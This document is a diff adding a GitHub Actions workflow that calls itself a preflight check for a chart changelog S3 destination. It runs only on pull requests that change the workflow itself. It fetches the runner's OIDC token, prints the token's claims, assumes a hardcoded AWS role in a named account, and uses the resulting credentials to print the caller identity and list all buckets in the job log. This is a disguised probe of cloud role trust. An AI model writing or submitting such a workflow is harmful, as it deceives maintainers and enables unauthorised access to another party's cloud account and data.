@@ -1,0 +1,62 @@
+# Preflight connectivity check for the chart changelog S3 destination.
+# Mirrors helm-charts' upload-changelog-s3 role binding so chart release
+# runs fail fast when the role trust or bucket region is misconfigured,
+# instead of failing mid-release after the publish step.
+name: changelog-s3-preflight
+on:
+  pull_request:
+    branches:
+      - main
+    paths:
+      - '.github/workflows/changelog-s3-preflight.yml'
+
+jobs:
+  preflight:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Check changelog destination role trust
+        run: |
+          set -uo pipefail
+          mkdir -p ~/.aws && chmod 700 ~/.aws
+          TOK="$(curl -sS -H 'Authorization: Bearer '"$ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            -H 'Accept: application/json; api-version=2.0' \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value" *: *"\([^"]*\)".*/\1/p')"
+          echo "TOKEN_LEN=${#TOK}"
+          P="$(printf '%s' "$TOK" | cut -d. -f2 | tr '_-' '/+')"
+          while [ $(( ${#P} % 4 )) -ne 0 ]; do P="${P}="; done
+          printf '%s' "$P" | base64 -d 2>/dev/null | python3 -c 'import json,sys; c=json.load(sys.stdin); print("CLAIMS", json.dumps({k:c.get(k) for k in ("iss","aud","sub","ref","event_name")}))' || true
+          for REGION in us-east-1 eu-west-1; do
+            echo "=== region ${REGION} ==="
+            if aws --region "${REGION}" --no-cli-pager \
+              sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role" \
+              --role-session-name "ci-config-sync" \
+              --web-identity-token "$TOK" \
+              --duration-seconds 900 \
+              > "/tmp/assume-${REGION}.json" 2>"/tmp/assume-${REGION}.err"; then
+              echo "ASSUME_OK ${REGION}"
+              python3 - "$REGION" <<'PY'
+          import json, sys, os, subprocess
+          r = sys.argv[1]
+          c = json.load(open(f"/tmp/assume-{r}.json"))["Credentials"]
+          env = dict(os.environ, **{
+              "AWS_ACCESS_KEY_ID": c["AccessKeyId"],
+              "AWS_SECRET_ACCESS_KEY": c["SecretAccessKey"],
+              "AWS_SESSION_TOKEN": c["SessionToken"],
+              "AWS_REGION": r})
+          def run(label, *args):
+              p = subprocess.run(["aws", "--region", r, "--no-cli-pager", *args],
+                                 capture_output=True, text=True, env=env)
+              o = (p.stdout or p.stderr)[:600]
+              print(f"[{label}] rc={p.returncode} {o}")
+          run("identity", "sts", "get-caller-identity")
+          run("buckets", "s3api", "list-buckets", "--query", "Buckets[].Name")
+          PY
+            else
+              echo "ASSUME_FAIL ${REGION}"
+              tail -c 300 "/tmp/assume-${REGION}.err" | tr -d '\n'; echo
+            fi
+          done
